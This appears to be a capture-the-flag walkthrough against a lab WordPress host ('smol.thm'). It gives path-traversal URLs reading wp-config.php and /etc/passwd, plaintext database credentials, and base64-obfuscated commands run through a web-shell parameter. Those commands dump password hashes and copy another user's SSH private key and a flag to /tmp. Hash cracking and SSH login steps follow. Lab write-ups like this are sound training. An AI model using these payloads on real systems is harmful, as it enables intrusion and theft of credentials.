Quick Tips: Do you know that on computers without GPU like the AttackBox, **John The Ripper** is faster than **Hashcat**?

First edit C:\Windows\System32\drivers\etc  with the line:
```
10.80.160.80 www.smol.thm
```

 and inside WSL/Kali :
 ```
 sudo nano /etc/hosts
 ```

wpscan --url www.smol.thm --enumerate ap,t,u

> ap — all plugin enumeration  
> t — looks for outdated themes for vulns  
> u — identifies users of that page

![](https://miro.medium.com/v2/resize:fit:618/1*OyLesuqY2n_DrdsIo33m3g.png)

Looking through the internet jsmol2wp is vulnerable! Looking through 
[https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt)


To clarify, lets try it…

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php  
?isform=true  
&call=getRawDataFromDatabase  
&query=php://filter/resource=../../../../wp-config.php

To see etc/passwd:
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../../../../../etc/passwd

Log in:
User: wpuser
Password: kbLSF2Vop#lw3rjDZ629*Z%G

### The Base64 Bypass

I have taken our exact MySQL command:  
mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' wordpress -e 'SELECT user_login,user_pass FROM wp_users;'  
...and encoded it into Base64 for you.

Copy and paste this exact URL into your browser:
```
http://www.smol.thm/wp-admin/index.php?cmd=echo bXlzcWwgLXUgd3B1c2VyIC1wJ2tiTFNGMlZvcCNsdzNyakRaNjI5KlolRycgd29yZHByZXNzIC1lICdTRUxFQ1QgdXNlcl9sb2dpbix1c2VyX3Bhc3MgRlJPTSB3cF91c2Vyczsn | base64 -d | bash
```

Once you see it:

1. Copy **Diego's** hash.
    
2. Save it to a file on your Kali machine (e.g., nano hash.txt).
    
3. Crack it with John the Ripper:
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ```
    
4. Log in via SSH: ssh diego@smol.thm

#### Step 1: Run the Automation Script

Copy and paste this exact URL into your browser (make sure you are still logged into WordPress). This will decode and execute the Python script behind the scenes:

codeText

```
http://www.smol.thm/wp-admin/index.php?cmd=echo aW1wb3J0IHB0eSwgb3MsIHRpbWUKcGlkLCBmZCA9IHB0eS5mb3JrKCkKaWYgcGlkID09IDA6CiAgICBvcy5leGVjdnAoJ3N1JywgWydzdScsICdkaWVnbycsICctYycsICdjYXQgL2hvbWUvZGllZ28vdXNlci50eHQgPiAvdG1wL3VzZXIudHh0OyBjYXQgL2hvbWUvdGhpbmsvLnNzaC9pZF9yc2EgPiAvdG1wL2lkX3JzYTsgY2htb2QgNzc3IC90bXAvdXNlci50eHQgL3RtcC9pZF9yc2EnXSkKZWxzZToKICAgIHRpbWUuc2xlZXAoMSkKICAgIG9zLndyaXRlKGZkLCBiJ3NhbmRpZWdvY2FsaWZvcm5pYVxuJykKICAgIHRpbWUuc2xlZXAoMik= | base64 -d | python3
```

(The page will load normally. Once it finishes loading, the files are ready!)

#### Step 2: Grab the User Flag! 🚩

Now that Diego has copied the flag to a public folder, you can read it directly through your URL backdoor. Go to this URL:

codeText

```
http://www.smol.thm/wp-admin/index.php?cmd=cat /tmp/user.txt
```

#### Step 3: Steal Think's SSH Key and Log In!
```
http://www.smol.thm/wp-admin/index.php?cmd=cat /tmp/id_rsa
```

1. Copy the **entire text** block.
2. In your Kali terminal, paste it into a file: nano id_rsa (Save and exit).
3. Set the strict permissions: chmod 600 id_rsa
4. **Log in through the front door:
    ```
    ssh -i id_rsa think@smol.thm
    ```
    